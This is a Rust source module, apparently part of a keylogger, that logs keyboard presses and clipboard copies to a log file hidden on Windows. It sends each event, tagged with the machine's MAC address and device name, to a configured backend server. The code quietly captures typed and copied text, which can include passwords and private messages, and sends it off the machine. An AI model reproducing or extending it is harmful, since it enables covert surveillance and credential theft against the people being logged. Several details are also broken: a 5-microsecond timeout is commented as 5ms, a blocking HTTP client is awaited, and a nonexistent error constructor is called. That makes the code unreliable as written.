use crate::config;
use crate::get_mac_addr;
use chrono::Local;
use serde::Serialize;
#[cfg(windows)]
use std::os::windows::fs::OpenOptionsExt;
use std::{
    fs::OpenOptions,
    io::{self, Write},
    time::Duration,
};

use tokio::time::{sleep, timeout};

const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
const TIMEOUT_DURATION: Duration = Duration::from_micros(5); // 设置超时时间为5ms

#[derive(Serialize)]
struct LogEvent {
    device_id: String,
    device_name: String,
    event_type: String,
    content: String,
    timestamp: i64,
    timezone: String,
}

#[derive(Serialize)]
pub enum EventType {
    KeyboardPress,
    ClipboardCopy,
}

impl EventType {
    fn as_str(&self) -> &'static str {
        match self {
            EventType::KeyboardPress => "按下按键",
            EventType::ClipboardCopy => "复制文本",
        }
    }

    fn as_event_type(&self) -> &'static str {
        match self {
            EventType::KeyboardPress => "keyboard_press",
            EventType::ClipboardCopy => "clipboard_copy",
        }
    }
}

pub async fn log_event(event_type: EventType, content: &str) {
    let timestamp = Local::now();
    let offset = timestamp.offset();
    let time_str = format!(
        "{} UTC{:+}",
        timestamp.format("%Y/%m/%d-%H:%M:%S%.3f"),
        offset.local_minus_utc() / 3600
    );

    let mut options = OpenOptions::new();
    options.append(true).create(true);

    #[cfg(windows)]
    options.custom_flags(FILE_ATTRIBUTE_HIDDEN);

    let file = match options.open("latest.log") {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Error opening log file: {}", e);
            return;
        }
    };

    let mut file = io::BufWriter::new(file);

    if let Err(e) = writeln!(file, "{} {} {}", time_str, event_type.as_str(), content) {
        eprintln!("Error writing to log file: {}", e);
    }

    let log_event = LogEvent {
        device_id: get_mac_addr::get_mac_addr(),
        device_name: config::get_device_name(),
        event_type: event_type.as_event_type().to_string(),
        content: content.to_string(),
        timestamp: timestamp.timestamp(),
        timezone: format!("UTC{:+}", offset.local_minus_utc() / 3600),
    };

    // Send log event to backend
    // It's better to use async here
    let client = reqwest::blocking::Client::new();

    let mut retry_count = 0;

    while retry_count < 3 {
        match timeout(TIMEOUT_DURATION, send_log_event(&client, &log_event)).await {
            Ok(response) => {
                match response {
                    Ok(_) => {
                        // 成功收到确认，退出循环
                        break;
                    }
                    Err(e) => {
                        eprintln!("Error sending log to backend: {}", e);
                    }
                }
            }
            Err(_) => {
                eprintln!("Timeout sending log to backend, retrying...");
            }
        }
        retry_count += 1;
    }

    if retry_count == 3 {
        eprintln!("Failed to send log to backend after 3 retries");
    }
}

async fn send_log_event(client: &reqwest::blocking::Client, log_event: &LogEvent) -> Result<(), reqwest::Error> {
    let response = client
        .post(&config::get_backend_url())
        .json(log_event)
        .send()
        .await?;

    if response.status().is_success() {
        // 后端返回200状态码表示成功
        // 其实200-299都可以
        Ok(())
    } else {
        Err(reqwest::Error::new(reqwest::ErrorKind::Other,"Backend did not confirm"))
    }
}
